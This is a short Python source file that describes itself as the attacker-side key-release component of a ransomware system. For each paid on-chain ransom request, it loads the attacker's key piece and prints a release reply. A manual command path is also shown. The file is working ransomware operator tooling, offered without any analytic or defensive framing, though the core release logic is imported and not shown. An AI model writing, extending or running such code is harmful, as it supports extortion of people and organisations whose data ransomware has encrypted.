"""Attacker-side key release (stdin: on-chain request blob, stdout: reply).

This is the ransomware's half of contract 3 on the attacker host: the payment
watcher runs it for each paid request and posts whatever it prints. It can
also be used by hand on the manual path:

    yom-ransomware-release < exchange_request.json > exchange_reply.json
"""

import sys

from software.core import settings
from software.ransomware.runtime.engine import ATTACKER_PIECE, release


def main():
    attacker = settings.load(ATTACKER_PIECE)
    blob = sys.stdin.buffer.read()
    if not blob.strip():
        print("no request on stdin", file=sys.stderr)
        return 2
    try:
        reply = release(attacker, blob)
    except (ValueError, KeyError) as error:
        print(f"release refused: {error}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(reply + b"\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
